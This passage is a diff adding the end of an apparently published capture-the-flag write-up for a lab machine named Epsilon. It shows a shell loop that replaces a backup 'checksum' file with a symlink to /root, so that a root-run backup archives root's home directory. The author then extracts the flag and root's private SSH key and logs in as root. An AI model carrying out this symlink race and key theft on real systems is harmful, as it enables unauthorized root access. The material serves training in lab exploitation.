+        </span><span class="nb">rm</span> <span class="nt">-f</span> checksum<span class="p">;</span> 
+        <span class="nb">ln</span> <span class="nt">-s</span> /root checksum<span class="p">;</span> 
+        <span class="nb">echo</span> <span class="s2">"Replaced checksum"</span><span class="p">;</span> 
+        <span class="nb">sleep </span>5<span class="p">;</span> 
+        <span class="nb">echo</span> <span class="s2">"Backup probably done now"</span><span class="p">;</span>
+        <span class="nb">break</span><span class="p">;</span>
+    <span class="k">fi</span><span class="p">;</span> 
+    <span class="nb">sleep </span>1<span class="p">;</span> 
+<span class="k">done</span>
+</code></pre></div></div>
+<p>This will loop ever second, each time checking for the existence of <code class="language-plaintext highlighter-rouge">checksum</code> in the current directory. When it does exist, it will remove it, and replace it with a symbolic link. Then it prints, sleeps, and prints again, and exits the loop. I’ll run this on Epsilon:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tom@epsilon:/opt/backups$</span><span class="w"> </span><span class="k">while</span> :<span class="p">;</span> <span class="k">do if </span><span class="nb">test</span> <span class="nt">-f</span> checksum<span class="p">;</span> <span class="k">then </span><span class="nb">rm</span> <span class="nt">-f</span> checksum<span class="p">;</span> <span class="nb">ln</span> <span class="nt">-s</span> /root checksum<span class="p">;</span> <span class="nb">echo</span> <span class="s2">"Replaced checksum"</span><span class="p">;</span> <span class="nb">sleep </span>5<span class="p">;</span> <span class="nb">echo</span> <span class="s2">"Backup probably done now"</span><span class="p">;</span> <span class="nb">break</span><span class="p">;</span> <span class="k">fi</span><span class="p">;</span> <span class="nb">sleep </span>1<span class="p">;</span> <span class="k">done</span>
+<span class="go">Replaced checksum
+Backup probably done now
+</span></code></pre></div></div>
+<p>The new backup is significantly larger than the others:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tom@epsilon:/var/backups/web_backups$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 159848
+-rw-r--r-- 1 root root  1003520 Mar  9 21:00 313767730.tar
+-rw-r--r-- 1 root root  1003520 Mar  9 21:01 333334780.tar
+-rw-r--r-- 1 root root  1003520 Mar  9 21:02 358658250.tar
+-rw-r--r-- 1 root root  1003520 Mar  9 21:03 386669510.tar
+-rw-r--r-- 1 root root 80332800 Mar  9 21:04 498453770.tar
+</span></code></pre></div></div>
+<p>I’ll copy it to <code class="language-plaintext highlighter-rouge">/dev/shm</code> and and extract it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tom@epsilon:/var/backups/web_backups$</span><span class="w"> </span><span class="nb">cp </span>645074490.tar /dev/shm/
+<span class="gp">tom@epsilon:/var/backups/web_backups$</span><span class="w"> </span><span class="nb">cd</span> /dev/shm/
+<span class="gp">tom@epsilon:/dev/shm$</span><span class="w"> </span><span class="nb">tar </span>xf 498453770.tar 
+<span class="go">tar: opt/backups/checksum/.bash_history: Cannot mknod: Operation not permitted
+tar: Exiting with failure status due to previous errors
+</span></code></pre></div></div>
+<p>There are a couple errors, but over all it works. There’s an <code class="language-plaintext highlighter-rouge">opt</code> directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tom@epsilon:/dev/shm$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">498453770.tar  multipath  opt
+</span><span class="gp">tom@epsilon:/dev/shm$</span><span class="w"> </span><span class="nb">cd </span>opt/backups       
+<span class="gp">tom@epsilon:/dev/shm/opt/backups$</span><span class="w">
+</span><span class="gp">tom@epsilon:/dev/shm/opt/backups$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 972
+-rw-r--r-- 1 tom tom 993280 Mar  9 21:07 637358080.tar
+drwx------ 9 tom tom    300 Dec 20 11:06 checksum
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">checksum</code> is a directory, not a file. It looks like a home directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tom@epsilon:/dev/shm/opt/backups$</span><span class="w"> </span><span class="nb">ls </span>checksum/
+<span class="go">docker-compose.yml  lambda.sh  root.txt  src
+</span></code></pre></div></div>
+<p>I can read <code class="language-plaintext highlighter-rouge">root.txt</code> at this point:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tom@epsilon:/dev/shm/opt/backups/checksum$</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">05460984************************
+</span></code></pre></div></div>
+<p>I can also grab root’s SSH keys:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tom@epsilon:/dev/shm/opt/backups/checksum/.ssh$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 12
+-rw------- 1 tom tom  566 Dec  1 13:08 authorized_keys
+-rw------- 1 tom tom 2602 Dec  1 13:07 id_rsa
+-rw-r--r-- 1 tom tom  566 Dec  1 13:07 id_rsa.pub
+</span></code></pre></div></div>
+<p>With that <code class="language-plaintext highlighter-rouge">id_rsa</code> on my system, I can connect over SSH as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/epsilon-root root@10.10.11.134
+<span class="go">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)
+...[snip]...
+</span><span class="gp">root@epsilon:~#</span><span class="w">
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2022/03/10/htb-epsilon.html"></a>
+</article>
